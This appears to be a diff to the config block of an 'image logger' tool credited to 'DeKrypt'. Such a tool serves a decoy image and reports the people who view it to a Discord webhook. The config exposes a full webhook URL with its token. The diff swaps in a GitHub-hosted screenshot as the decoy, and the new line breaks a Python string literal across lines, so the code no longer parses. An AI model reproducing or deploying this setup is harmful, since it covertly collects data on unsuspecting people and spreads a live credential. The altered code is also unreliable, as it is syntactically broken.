@@ -13,7 +13,8 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1444825048526491759/5NgrQ_C0lj2hqIU8se1fsXWF27FhizCM-v7aV-8FtTDW--Cu71p4jzXVQf-LbB0yEYg7",
-    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHIhf_YUD_wuYXpGw5AVVV0f1XDwWk1VU5fA&s", # You can also have a custom image by using a URL argument
+    "image": "https://github.com/mmm410060-sketch/welcome/blob/main/VirtualBox_kalii_17_09_2025_04_21_12.png
+", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
